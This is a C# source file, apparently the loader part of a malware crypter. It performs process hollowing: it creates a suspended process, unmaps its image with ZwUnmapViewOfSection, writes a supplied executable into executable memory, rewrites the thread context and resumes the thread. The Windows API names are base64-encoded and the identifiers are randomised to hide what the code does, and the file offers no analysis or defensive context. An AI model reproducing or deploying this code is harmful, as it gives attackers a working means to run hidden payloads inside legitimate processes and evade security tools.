using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Jungle
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool qrcfkrbqgnvqowkotazx(string vqhgnxhvtgaixrkr, StringBuilder sfpleudarlvstvphxd, IntPtr opceqaenbxpkoyqjrx, IntPtr yletcelaqjwjnjixt, [MarshalAs(UnmanagedType.Bool)] bool soonufgywgkruuxdkj, int zqquneivrpwqncwjs, IntPtr ydfgwwtlcaycdbjgbgse, string vbjsaqfkuthodbrjh, byte[] bezzveiceppbdtpjvgvr, IntPtr[] wjqhztdqqfvihdnejqf);

	public delegate bool orpuhtusqcaecvhbpgk(IntPtr skxaxwzisjyqiflcqjtz, IntPtr vtxceuzwsgnhcrkbsfrh, byte[] hbqpinezvrptngfqfkx, uint unexaspqvfrqgeiu, int dxuexfagacgrbvxohsh);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool tovdnpeketcxszjndiwn(IntPtr yndoerzhrcoyfexh, IntPtr tkgpprxflwbvtnkit, ref IntPtr gajudtehsfbihyjgxlby, int xjyoeulnvhdoizzfvt, ref IntPtr iljuhsatzgrbpaaylc);

	public delegate IntPtr gfrsbdrwpxxdchnzcuu(IntPtr iqsebovyqdhwqbpfs, IntPtr xdiiqrxtbnwjzyurvdj, IntPtr xzohxargiyhzpnsovq, int oiypvloixyvqvvbn, int tksgnzvtpxizobuvsi);

	public delegate uint gocngjjzjswdligx(IntPtr rskufyftnnrxoggv, IntPtr pjplyockxlgiyqsd);

	public delegate uint qwcbhkowiggklhqxcez(IntPtr avojgvabofsqvffsjrpr);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool rcucvabyilfqtsczprb(IntPtr fvtookancwfyduva, uint[] hjvyxexshckpfufon);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool fbiwwfvcqkvzpejryqq(IntPtr jefplkrbcsdjqydnwepz, uint[] ehlgzpcblholqlxyux);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public static T uaudtkjgyirfbxgkwnan<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(T));
	}

	public static bool yglgwgdiliknhk(byte[] uqgycnjiknhkagfbjqd, string pzxbickcbxkqrrbb)
	{
		qrcfkrbqgnvqowkotazx qrcfkrbqgnvqowkotazx = uaudtkjgyirfbxgkwnan<qrcfkrbqgnvqowkotazx>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
		rcucvabyilfqtsczprb rcucvabyilfqtsczprb = uaudtkjgyirfbxgkwnan<rcucvabyilfqtsczprb>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
		tovdnpeketcxszjndiwn tovdnpeketcxszjndiwn = uaudtkjgyirfbxgkwnan<tovdnpeketcxszjndiwn>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
		gfrsbdrwpxxdchnzcuu gfrsbdrwpxxdchnzcuu = uaudtkjgyirfbxgkwnan<gfrsbdrwpxxdchnzcuu>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
		orpuhtusqcaecvhbpgk orpuhtusqcaecvhbpgk = uaudtkjgyirfbxgkwnan<orpuhtusqcaecvhbpgk>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
		fbiwwfvcqkvzpejryqq fbiwwfvcqkvzpejryqq = uaudtkjgyirfbxgkwnan<fbiwwfvcqkvzpejryqq>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
		qwcbhkowiggklhqxcez qwcbhkowiggklhqxcez = uaudtkjgyirfbxgkwnan<qwcbhkowiggklhqxcez>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
		gocngjjzjswdligx gocngjjzjswdligx = uaudtkjgyirfbxgkwnan<gocngjjzjswdligx>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] bezzveiceppbdtpjvgvr = new byte[68];
				int num = BitConverter.ToInt32(uqgycnjiknhkagfbjqd, 60);
				int num2 = BitConverter.ToInt16(uqgycnjiknhkagfbjqd, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(uqgycnjiknhkagfbjqd, num + 84));
				if (qrcfkrbqgnvqowkotazx(null, new StringBuilder(pzxbickcbxkqrrbb), zero, zero, soonufgywgkruuxdkj: false, 4, zero, null, bezzveiceppbdtpjvgvr, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (rcucvabyilfqtsczprb(array[1], array2))
					{
						IntPtr tkgpprxflwbvtnkit = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr gajudtehsfbihyjgxlby = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr iljuhsatzgrbpaaylc = IntPtr.Zero;
						if (tovdnpeketcxszjndiwn(array[0], tkgpprxflwbvtnkit, ref gajudtehsfbihyjgxlby, (int)intPtr2, ref iljuhsatzgrbpaaylc) && unchecked((long)gocngjjzjswdligx(array[0], gajudtehsfbihyjgxlby)) == 0L)
						{
							IntPtr vtxceuzwsgnhcrkbsfrh = gfrsbdrwpxxdchnzcuu(xdiiqrxtbnwjzyurvdj: new IntPtr(BitConverter.ToInt32(uqgycnjiknhkagfbjqd, num + 52)), xzohxargiyhzpnsovq: new IntPtr(BitConverter.ToInt32(uqgycnjiknhkagfbjqd, num + 80)), iqsebovyqdhwqbpfs: array[0], oiypvloixyvqvvbn: 12288, tksgnzvtpxizobuvsi: 64);
							int num3 = vtxceuzwsgnhcrkbsfrh.ToInt32();
							int dxuexfagacgrbvxohsh = default(int);
							orpuhtusqcaecvhbpgk(array[0], vtxceuzwsgnhcrkbsfrh, uqgycnjiknhkagfbjqd, (uint)(int)intPtr, dxuexfagacgrbvxohsh);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(uqgycnjiknhkagfbjqd, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(uqgycnjiknhkagfbjqd, array3[5], array4, 0, array4.Length);
								orpuhtusqcaecvhbpgk(vtxceuzwsgnhcrkbsfrh: new IntPtr(num3 + array3[3]), unexaspqvfrqgeiu: (uint)(int)new IntPtr(array4.Length), skxaxwzisjyqiflcqjtz: array[0], hbqpinezvrptngfqfkx: array4, dxuexfagacgrbvxohsh: dxuexfagacgrbvxohsh);
							}
							orpuhtusqcaecvhbpgk(vtxceuzwsgnhcrkbsfrh: new IntPtr(unchecked((long)array2[41]) + 8L), unexaspqvfrqgeiu: (uint)(int)new IntPtr(4), skxaxwzisjyqiflcqjtz: array[0], hbqpinezvrptngfqfkx: BitConverter.GetBytes(vtxceuzwsgnhcrkbsfrh.ToInt32()), dxuexfagacgrbvxohsh: dxuexfagacgrbvxohsh);
							array2[44] = (uint)(vtxceuzwsgnhcrkbsfrh.ToInt32() + BitConverter.ToInt32(uqgycnjiknhkagfbjqd, num + 40));
							fbiwwfvcqkvzpejryqq(array[1], array2);
						}
					}
					qwcbhkowiggklhqxcez(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
